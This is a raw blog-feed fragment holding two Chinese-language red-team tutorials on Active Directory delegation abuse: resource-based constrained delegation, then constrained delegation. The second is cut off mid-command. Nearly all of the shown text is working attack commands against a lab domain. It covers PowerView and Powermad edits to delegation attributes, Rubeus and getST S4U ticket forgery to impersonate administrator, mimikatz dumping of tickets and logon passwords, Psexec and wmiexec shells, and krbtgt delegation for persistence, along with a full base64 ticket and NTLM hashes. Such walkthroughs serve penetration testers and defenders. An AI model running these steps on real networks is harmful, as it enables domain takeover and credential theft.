class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">实战中一句话执行</span><br><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">"Import-Module .\powerview.ps1;<span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"</span>O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-4223269421</span><span class="literal">-3390898629</span><span class="literal">-3395902804</span><span class="literal">-1119</span>)\<span class="string">";<span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0);Get-DomainComputer WIN-SKE-PC | Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=<span class="variable">$SDBytes</span>&#125; -Verbose"</span></span><br></pre></td></tr></table></figure><p><a name="uEodQ"></a></p><h4 id="win-server-2012以上："><a href="#win-server-2012以上：" class="headerlink" title="win server 2012以上："></a>win server 2012以上：</h4><p>ActiveDirectory修改</p><blockquote><p>Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项</p></blockquote><p>ActiveDirectory模块默认只在域控上安装，如果不是域控可以从域控上把DLL文件复制出来，然后导入即可</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br><span class="line">Set-ADComputer web-<span class="number">2012</span> -PrincipalsAllowedToDelegateToAccount test2023$</span><br><span class="line">Get-ADComputer web-<span class="number">2012</span> -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure><p><a name="Ptx4I"></a></p><h4 id="工具利用："><a href="#工具利用：" class="headerlink" title="工具利用："></a>工具利用：</h4><p><a name="JwmCs"></a></p><h5 id="SharpAllowedToAct-Modify"><a href="#SharpAllowedToAct-Modify" class="headerlink" title="SharpAllowedToAct-Modify"></a>SharpAllowedToAct-Modify</h5><p>域账户必须要是将攻击的机器加入域的账户，否则没有权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-m</span>参数为你添加的机器账号，<span class="literal">-u</span>为ldap账号，<span class="literal">-p</span>为ldap密码，<span class="literal">-t</span>为准备要攻击的机器名，<span class="literal">-a</span>为域控地址，<span class="literal">-d</span>为域名，如：</span><br><span class="line">.\SharpAllowedToAct.exe <span class="literal">-m</span> test2023 <span class="literal">-u</span> susan <span class="literal">-p</span> asd123= <span class="literal">-t</span> web<span class="literal">-2012</span> <span class="literal">-a</span> AD01<span class="literal">-2016</span>.redteam.com <span class="literal">-d</span> redteam.com</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查询是否修改成功</span></span><br><span class="line">.\SharpView.exe <span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> web<span class="literal">-2012</span> <span class="literal">-Properties</span> msds<span class="literal">-allowedtoactonbehalfofotheridentity</span></span><br></pre></td></tr></table></figure><p>![image.png](10.png %}<br />![image.png](11.png %}<br><a name="wQvaw"></a></p><h4 id="清除msds-allowedtoactonbehalfofotheridentity属性"><a href="#清除msds-allowedtoactonbehalfofotheridentity属性" class="headerlink" title="清除msds-allowedtoactonbehalfofotheridentity属性"></a>清除msds-allowedtoactonbehalfofotheridentity属性</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sharpview.exe <span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> web<span class="literal">-2012</span> <span class="literal">-Clear</span> <span class="string">'msds-allowedtoactonbehalfofotheridentity'</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure><p><a name="WZ3On"></a></p><h3 id="3、攻击思路"><a href="#3、攻击思路" class="headerlink" title="3、攻击思路"></a>3、攻击思路</h3><p><a name="Amzz0"></a></p><h4 id="方法1：Rubeus-伪造票据"><a href="#方法1：Rubeus-伪造票据" class="headerlink" title="方法1：Rubeus | 伪造票据"></a>方法1：Rubeus | 伪造票据</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建的机器账户</span></span><br><span class="line">.\Rubeus.exe hash /user:test2023<span class="variable">$</span> /password:ASD123= /domain:redteam.com</span><br><span class="line"></span><br><span class="line">伪造票据</span><br><span class="line">.\Rubeus.exe s4u /user:test2023<span class="variable">$</span> /rc4:C680D6B43E9E004BA4680722D78E1405 /impersonateuser:administrator /msdsspn:cifs/web<span class="literal">-2012</span>.redteam.com /ptt</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /user:test2023<span class="variable">$</span> /rc4:C680D6B43E9E004BA4680722D78E1405 /impersonateuser:administrator /msdsspn:cifs/web<span class="literal">-2012</span>.redteam.com /ptt</span><br></pre></td></tr></table></figure><p>![image.png](12.png %}</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 导入票据</span></span><br><span class="line">.\Rubeus.exe ptt /ticket:doIGLDCCBiigAwIBBaEDAgEWooIFODCCBTRhggUwMIIFLKADAgEFoQ0bC1JFRFRFQU0uQ09NoicwJaADAgECoR4wHBsEY2lmcxsUd2ViLTIwMTIucmVkdGVhbS5jb22jggTrMIIE56ADAgESoQMCAQGiggTZBIIE1QUWuyqH4MPNeSvepiMjZ8Cmqea+OSBW81e4d02/YhP4q7TJKl3qNtF0NAsgc42wAAtvUXXie8QVMXUvhQ0PfCh1alkAcrK4tyZyl6yhf4fq+PEkgn96+ibqsNDol+<span class="number">5</span>Y1CVjjDLwQQ9svaSJSLnHK3BDZ03aYSVNZn5QxuNIQc9nsFZ5g/rrXAaOLelwGYHyZHCONYaxxzrxN50OWaOSg9Cj4UKTFo4c1BpQs15NeknCQ2Rf8oLkCGOET6F41Qqz2Q5y1vja6tQLVsthPV50jc95j3OIrY1kgoLvLjQkQGhF4KGqTcMpTg6tXelewPh85FrmZ9ww1NkSmIY6knmIrchAKLtliP2ta1OKoyXMUQid2CUpGjanO508S1ouQNLJABdFd1tOqISru/P5jsPuTAcMIU807+<span class="number">8</span>l9JwBUy/nukF79bgDOXoZ92V/LyGZPoQGS870Hriauiis4OcHzYUTApb3P+KvgnUpa1NYS9xq2dtnYYWj+YSM4kDXA8m8KuXD2PunSEK6Ujw4E/<span class="number">8</span>ALq3ggIQC79ScfMZfpOagEJ9zktvzd/<span class="number">1</span>U8FBHQ3nGDOBoYgQ7F8pFVN8eFQYeFm0mbRfuuGwSLUssdZpENqxYRA4HRz74B5FK8uKXcunOZgkhjc8UJVakN4Xntj8fYDN6YNoNZMpypw2N0n8YJUxtcl/xjJ3M2On1YJZSIxQnRRNygJaWP1qI0GsCAy2YOe6IcDDuX8aAUbYcKNCGw6GUoph0rHU6HqzvkTub1p3GEOYOAXj/QID77jUc9bf1Fxcpn/bF4uWs9ORbf3XYdkGhvT3K/pZGIXBnz3JXMXJKaG55SdsB7Jy+cZylt9HRzqgzrrLGKANOSxpb1GabfMgJyhdsxLFP6HQi40wySmXi8Ct0Xh+xtwx4OjUnjyUNNapVffOKKlR3mo417AR0wq6dAipz1akKlCH/n0QB/<span class="number">2</span>G4TLUY++<span class="number">6</span>b4t/cMJxlOBGPGnvf8IX3qzfTkH3pjUCAA/r/l1npVw4ZpVy7760Zibw04j/mpZrC3TdZeLO2sykyLHfeEBt19AbWwDB5HPzzKdonMwBYxceHJ1LPcQe24zuL94GKFAJiSMeY3yBW0zWrbXXjnprhLiJpuBmbmQP2YlfoScNfEnVpYrE/G/hq2ThYZx+gorfC5AfRym0cSiiV7W8sC5c3tIwbUvB94vxa62gyuhSVQols3ApPLXIFDwOGfQgN1NovZbZsy5WuQPHZS78Zkww4fH2t479H+NFymOWTtmJ+jfrFv/<span class="number">4</span>BmlbqfNV9GU/kldcHbJZ3JcJ1Sw7W8CVmRPTI+<span class="number">8</span>p0t7UA/vtgPQ+eNJdzvXbfprHbuvIaJkOACGycIHvXH1hmx7GS6OGA9LhO5mDQOlNPLWY/RaAlSKbS7defK6fq6GmxeQ+<span class="number">79</span>o/N8pcUrKYv/+<span class="number">3</span>yplh8WYmmB4vJ0Tw1fJyMtDziZJjNafLrXR5vFE8QBawk3ad/zzwl3KF1GcTayHZdOqss5q5xdVNDeBvEbKwOx3VCngGpDVn4K+lZCDfJHjPIHKGb2rlzTpM2IYAawes8ky+rxT2pU0vzZqZ2ufx0RUsLMY0z3Me6+bPb0ICNqr2OiZ+cKATftEV11SQ+HARNtn2Ib+U5MWUP0lb+e5x2XujIxLlQJpO5V+MebxE7jhGO2+Kjgd8wgdygAwIBAKKB1ASB0X2BzjCBy6CByDCBxTCBwqAbMBmgAwIBEaESBBDtXpcKsREXIe0ePGCBEjlFoQ0bC1JFRFRFQU0uQ09NohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDIzMDIxMzEwNDM0MFqmERgPMjAyMzAyMTMyMDQzMzlapxEYDzIwMjMwMjIwMTA0MzM5WqgNGwtSRURURUFNLkNPTaknMCWgAwIBAqEeMBwbBGNpZnMbFHdlYi0yMDEyLnJlZHRlYW0uY29t</span><br></pre></td></tr></table></figure><p>![image.png](13.png %}<br />尝试连接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir \\web<span class="literal">-2012</span>.redteam.com\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Psexec连接速度会特别慢不知道为什么，得等很久</span></span><br><span class="line">.\Psexec.exe <span class="literal">-accepteula</span> \\web<span class="literal">-2012</span>.redteam.com cmd</span><br></pre></td></tr></table></figure><p>![image.png](14.png %}<br />![image.png](15.png %}<br><a name="oSZnT"></a></p><h4 id="方法2：getST-伪造票据"><a href="#方法2：getST-伪造票据" class="headerlink" title="方法2：getST | 伪造票据"></a>方法2：getST | 伪造票据</h4><p>伪造票据</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\getST.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> redteam.com/test2023<span class="variable">$</span>:ASD123= <span class="literal">-spn</span> cifs/web<span class="literal">-2012</span>.redteam.com <span class="literal">-impersonate</span> administrator</span><br></pre></td></tr></table></figure><p>![image.png](16.png %}<br />设置票据，连接机器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## cmd</span></span><br><span class="line">set KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">.\psexec.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> web<span class="literal">-2012</span>.redteam.com <span class="literal">-no</span><span class="literal">-pass</span> <span class="literal">-k</span> <span class="literal">-codec</span> gbk</span><br><span class="line">.\wmiexec.exe <span class="literal">-dc</span><span class="literal">-ip</span> <span class="number">10.10</span>.<span class="number">10.10</span> web<span class="literal">-2012</span>.redteam.com <span class="literal">-no</span><span class="literal">-pass</span> <span class="literal">-k</span> <span class="literal">-codec</span> gbk</span><br></pre></td></tr></table></figure><p>![image.png](17.png %}<br />或者将ccache文件转换为kirbi文件导入，建立ipc连接</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kekeo<span class="selector-class">.exe</span> <span class="string">"kerberos::ptt administrator@redteam.com_cifs~web-2012.redteam.com@REDTEAM.COM.kirbis"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line">dir \\web-<span class="number">2012</span><span class="selector-class">.redteam</span>.com\c$</span><br><span class="line"></span><br><span class="line">.\Psexec<span class="selector-class">.exe</span> \\web-<span class="number">2012</span><span class="selector-class">.redteam</span><span class="selector-class">.com</span> cmd</span><br></pre></td></tr></table></figure><p>![image.png](18.png %}<br><a name="pp5pg"></a></p><h4 id="后利用方法3：域管权限，权限维持打造黄金票据"><a href="#后利用方法3：域管权限，权限维持打造黄金票据" class="headerlink" title="后利用方法3：域管权限，权限维持打造黄金票据"></a>后利用方法3：域管权限，权限维持打造黄金票据</h4><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">## 创建委派机器账户</span><br><span class="line">powershell -exec bypass  '&amp;&#123;import-module .\Powermad.ps1; New-MachineAccount -MachineAccount administrator2 -Password $(ConvertTo-SecureString <span class="string">"asd123456="</span> -AsPlainText -Force) -<span class="keyword">Verbose</span> &#125;'</span><br><span class="line"></span><br><span class="line">## 给krbtgt创建委派权限</span><br><span class="line"><span class="keyword">Set</span>-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount administrator2$</span><br><span class="line"><span class="keyword">Get</span>-ADUser krbtgt -<span class="keyword">Properties</span> PrincipalsAllowedToDelegateToAccount</span><br><span class="line"></span><br><span class="line">.\sharpview.exe <span class="keyword">Set</span>-DomainObject -<span class="keyword">Identity</span> krbtgt -<span class="keyword">Clear</span> 'PrincipalsAllowedToDelegateToAccount' -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure><p>![image.png](19.png %}</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 申请票据</span></span><br><span class="line"><span class="string">.\getST.exe</span> <span class="string">redteam.com/administrator2$:asd123456=</span> <span class="string">-spn</span> <span class="string">krbtgt</span> <span class="string">-impersonate</span> <span class="string">administrator</span> <span class="string">-dc-ip</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入票据</span></span><br><span class="line"><span class="string">set</span> <span class="string">KRB5CCNAME=administrator.ccache</span></span><br><span class="line"></span><br><span class="line"><span class="string">.\psexec.exe</span> <span class="string">-dc-ip</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span> <span class="string">ad01-2016.redteam.com</span> <span class="string">-no-pass</span> <span class="string">-k</span> <span class="string">-codec</span> <span class="string">gbk</span></span><br></pre></td></tr></table></figure><p>![image.png](20.png %}<br><a name="bIg9a"></a></p><h4 id="方法4：敏感账户不可委派绕过"><a href="#方法4：敏感账户不可委派绕过" class="headerlink" title="方法4：敏感账户不可委派绕过"></a>方法4：敏感账户不可委派绕过</h4><p><a href="https://xz.aliyun.com/t/7454#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454#toc-2</a><br><a name="pp0wY"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/xmtblog/article/details/45866199" target="_blank" rel="noopener">AD域中常见属性名词解释</a><br /><a href="https://nosec.org/home/detail/4352.html" target="_blank" rel="noopener">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a><br /><a href="https://cloud.tencent.com/developer/article/1552171" target="_blank" rel="noopener">利用资源约束委派进行的提权攻击分析</a><br /><a href="https://www.cnblogs.com/zpchcbd/p/12963328.html" target="_blank" rel="noopener">基于资源的约束委派攻击</a><br /><a href="https://xz.aliyun.com/t/11555" target="_blank" rel="noopener">域渗透之委派攻击全集</a><br /><a href="https://mp.weixin.qq.com/s?__biz=MzAwMjc0NTEzMw==&mid=2653579473&idx=1&sn=89d630a4d0f48bc0dcd98f8d6c976fd4&chksm=811b7e93b66cf785d8ff3ae3ab782dd91ca9d38eb8dbec9af1d1a3eb75c0aac93ff0dfd29f68&scene=126&sessionid=1657518547&key=10cf53547534d2b5d5442373f9acc6bc5917447120253175277b7d1439fecfaf12d0c375d91e35bca61109d88b5b7922993a08b6d86269e06a5cead619ae9dcbc34ad5aab0008ba50fabc27c510953cd50396df08079c8dfed604335dde9e4e6f6ec96262709864eb85ff38b1c3979385d93aeb695431b15071cb34bbc0116a3&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows+Server+2016+x64&version=6307001e&lang=zh_CN&session_us=gh_ceb74c1acd23&exportkey=AWBHzQsIMK/GwXyn+bSbUAM=&acctmode=0&pass_ticket=jIK6vhF3mCQF690Iyuj5FSKbNmzYaIBgJZiGIoQCvwVOWNxsOgE4JsPo3XNpeRGw&wx_header=0&fontgear=2" target="_blank" rel="noopener">内网渗透 域ACL攻防</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a name=&quot;SDvMQ&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。&lt;/p&gt;</summary>
    
    
    
    <category term="委派" scheme="https://chenzidu.github.io/categories/%E5%A7%94%E6%B4%BE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>约束性委派利用</title>
    <link href="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/"/>
    <id>https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/</id>
    <published>2023-02-24T07:41:31.000Z</published>
    <updated>2024-03-11T07:47:58.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议<code>S4u2self（Service for User to Self）</code>和<code>S4U2proxy（Service for User to Proxy）</code>。<br>约束委派有两种：</p><blockquote><ol><li>仅使用Kerberos，不能进行协议转换</li><li>使用任何身份验证协议</li></ol></blockquote><a id="more"></a><h3 id="S4u2self-S4U2proxy"><a href="#S4u2self-S4U2proxy" class="headerlink" title="S4u2self &amp; S4U2proxy"></a>S4u2self &amp; S4U2proxy</h3><p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据；<br><code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据；<br>    约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。<br>配置了约束性委派的账户属性会有如下两个变化：</p><blockquote><ol><li>账户<code>userAccountControl</code>属性设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>标志位，值<code>16781312</code>。</li><li>账户<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务。</li></ol></blockquote><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">域名: redteam.com</span><br><span class="line">域控: </span><br><span class="line">    操作系统: Windows<span class="built_in"> Server </span>2016</span><br><span class="line">主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.10</span><br><span class="line"></span><br><span class="line">    主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.11</span><br><span class="line">域内主机:</span><br><span class="line">    操作系统: Windows<span class="built_in"> server </span>2012</span><br><span class="line">    主机名: web-2012</span><br><span class="line">    IP: 10.10.10.12</span><br><span class="line">攻击机:</span><br><span class="line">    操作系统: win 10</span><br><span class="line">    IP: 10.10.10.22</span><br></pre></td></tr></table></figure><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><strong>机器账户</strong><br>活动目录中的computers组内的计算机，也被称为机器账号。<br><strong>服务账户</strong><br>域账户注册SPN成为服务账户</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red saulgoodman #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red web<span class="number">-2012</span> #web<span class="number">-2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web<span class="number">-2012.</span>redteam.red</span><br></pre></td></tr></table></figure><p>域账户变成服务账户后会有委派，仅信任此用户作为指定服务的委派 -&gt; 添加想要委派的服务。</p><p>![image.png](1.png %}</p><h2 id="约束委派服务账户特征"><a href="#约束委派服务账户特征" class="headerlink" title="约束委派服务账户特征"></a><strong>约束委派服务账户特征</strong></h2><p> 配置了约束性委派的账户属性会有如下两个变化。<br>账户 userAccountControl 属性会被设置为TRUSTED_TO_AUTH_FOR_DELEGATION 标志位，账户 msDS-AllowedToDelegateTo 属性，添加允许委派的服务。<br>![image.png](2.png %}</p><h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><h4 id="方法1：ADFind"><a href="#方法1：ADFind" class="headerlink" title="方法1：ADFind"></a>方法1：ADFind</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派机器账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派服务账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p>![image.png](3.png %}</p><h4 id="方法2：SharpView"><a href="#方法2：SharpView" class="headerlink" title="方法2：SharpView"></a>方法2：SharpView</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerView查询约束委派机器账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainComputer -TrustedToAuth -Doamin redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto </span>-AutoSize</span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView查询约束委派服务账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainUser –TrustedToAuth -Domain redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span></span><br></pre></td></tr></table></figure><p>![image.png](4.png %}</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：使用机器账户的票据-kekeo"><a href="#方法1：使用机器账户的票据-kekeo" class="headerlink" title="方法1：使用机器账户的票据 | kekeo"></a>方法1：使用机器账户的票据 | kekeo</h4><p>约束性委派攻击的关键就是<strong>获得可转发的服务票据ST</strong>，获取根据约束性委派的执行过程可知，只要<strong>控制配置约束性委派服务的机器，并获得了它的密码</strong>，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>工具导出<code>lsass.exe</code>进程中所有的票据，得到想要的服务票据</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p>![image.png](5.png %}</p><p>使用kekeo工具申请服务票据（S4U2Proxy协议）</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请服务票据</span></span><br><span class="line">.<span class="string">\kekeo.exe</span> <span class="string">"tgs::s4u /tgt:[0;3e7]-2-1-40e10000-web-2012$@krbtgt-REDTEAM.COM.kirbi /user:Administrator@redteam.COM /service:cifs/ad01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~ad01-2016.redteam.com@REDTEAM.com.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir <span class="string">\\ad01-2016.redteam.com\c$</span></span><br><span class="line"></span><br><span class="line">.<span class="string">\Psexec.exe</span> -accepteula <span class="string">\\ad01-2016.redteam.red</span> cmd</span><br></pre></td></tr></table></figure><h4 id="方法2：使用机器账户的Hash值-Rubeus"><a href="#方法2：使用机器账户的Hash值-Rubeus" class="headerlink" title="方法2：使用机器账户的Hash值 | Rubeus"></a>方法2：使用机器账户的Hash值 | Rubeus</h4><p>与思路一类似，但是这里使用的是Hash值，利用条件：</p><blockquote><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol></blockquote><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 使用mimikatz获取机器账户NTLM Hash</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure><p>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>申请访问自身的可转发服务票据</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用Rubeus申请配置了约束委派机器账户web<span class="number">-2012</span>$的TGT</span><br><span class="line">.\Rubeus.exe asktgt /user:WEB<span class="number">-2012</span>$ /rc4:<span class="number">40</span>ee25b2c3f7ac3370429b18aca51e81 /domain:redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /nowrap</span><br><span class="line"></span><br><span class="line"># 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存</span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:ldap/ad02<span class="number">-2016.</span>redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /ptt 